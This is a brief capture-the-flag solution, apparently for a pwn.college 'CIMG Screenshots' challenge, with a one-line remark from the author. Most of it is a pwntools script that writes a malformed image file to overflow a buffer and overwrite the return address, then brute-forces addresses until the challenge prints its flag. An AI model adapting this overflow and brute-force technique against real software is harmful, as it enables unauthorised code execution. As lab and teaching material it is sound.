# CIMG Screenshots 2

#### This one is easy except I got stubborn trying to make an address work because it looked identical to the other loop addresses in win.
```python
from pwn import *

context.log_level = 'error'

def cimg(addr):
    win = addr
    
    pad = b'A' * 168
    pad += win
    
    data = p16(1)
    for p in pad:
        data += p8(40) + p8(40) + p8(40) + p8(p)
        
    width = len(pad)
    
    h = b'cIMG' + p16(4) + p8(width) + p8(1) + p32(2)
    h1337 = p16(1337) + p8(0)*3 + p8(width) + p8(1)

    with open('s.cimg', 'wb') as f:
        f.write(h + data + h1337)

if __name__ == '__main__':
    for addr in range(0x401576, 0x41116d +1):
        win = addr.to_bytes(3, byteorder='little')
        cimg(win)

        io = process(['/challenge/integration-cimg-screenshot-win', 's.cimg']) 
        out = io.recvall(timeout=2).decode(errors='ignore')
        if 'pwn.college' in out:
            print(f'Current address: {win}') 
            print(out)
            break
        else:
            print(f'Current address: {win}') 
            print(out)
```
